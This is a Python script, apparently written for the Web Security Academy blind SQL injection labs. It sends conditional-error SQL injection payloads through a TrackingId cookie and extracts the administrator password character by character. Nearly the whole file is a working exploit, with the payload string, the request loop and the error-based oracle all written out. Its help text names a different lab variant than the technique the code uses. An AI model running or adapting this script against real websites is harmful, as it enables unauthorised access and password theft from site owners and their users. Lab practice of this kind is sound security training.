#!usr/bin/python3

import sys
import requests
import re
from string import ascii_uppercase, ascii_lowercase, digits, ascii_letters


def search_group(group):

    groups={

        "-u": ascii_uppercase,
        "-l": ascii_lowercase,
        "-n": digits,
        "-a": "{}{}".format(digits,ascii_letters)
    }
    
    group_values = groups.get(group,0)
    return group_values

def request_target(target):

    print("[*] Performing a get request to: "+sys.argv[2])
    try:
        response = requests.get(target)
    except:
        print("\n[*] Error to request the target URL.\n")
        return 
    
    if response: # if status code is between 200 and 400
        print("[*] Got session id")
        return response
    else:
        print("\n[*] Got an response status error. Exiting for your own good...\n")
        return 


def blind_sql_exploit(ascii_group):

    #print(search_group(ascii_group))
    response = request_target(sys.argv[2])
    
    if not response: # Response error
        return

    admin_pass=""

    print("[*] Exploiting Blind SQL injection with conditional errors [*]")
    print("[*] Dumping administrator password byte-a-byte")
    
    for i in range(1,21): # from 1 to 20
        for char in search_group(ascii_group):
            #payload = "a'+union+select+'a'+from+users+where+username+=+'administrator'+and+SUBSTRING(password,{},1)='{}'--".format(i,char)
            payload = "a'+union+select+case+when+(username='administrator'+and+substr(password,{},1)='{}')+then+to_char(1/0)+else+null+end+from+users--".format(i,char)
            
            headers = {
                'Cookie': "TrackingId="+payload+"; session="+response.cookies["session"]
            }

            try:
                r = requests.get(response.url,headers=headers)
            except:
                print("Exploit error. Maybe the cookie or is fu**ing everything. ")

            output = re.search("Internal Server Error",r.text) # or beautifulsoup :)

            if output != None:

                admin_pass+=char
                print("[*] "+admin_pass)
                break
    
    print("\n[*] Even Blinded I can see it")
    print("[*] The administrator password is: "+ admin_pass)
    print()
    


def main():


    if len(sys.argv) == 2 and sys.argv[1] == "-h":
        print("\nThis is a testing script for Web Security Academy Blind SQL injection labs")
        print("Exploit for Blind SQL injection with conditional responses lab\n")
        print("Usage: conditional_blind_sql [OPTIONS] [target_url]\n")
        print("OPTIONS:\n\
        -u --> uppercase ascii letters\n\
        -l --> lowercase ascii letters\n\
        -n --> digits from 0 to 9\n\
        -a --> digits and ascii letters\
            \n")
    elif len(sys.argv) < 3:
        print("\n[*] Wrong number of arguments. Please type -h for help.\n")

    else:
        print("\n[*] Go baby GO!!!!\n")
        
        blind_sql_exploit(sys.argv[1])




if __name__ == "__main__":
    main()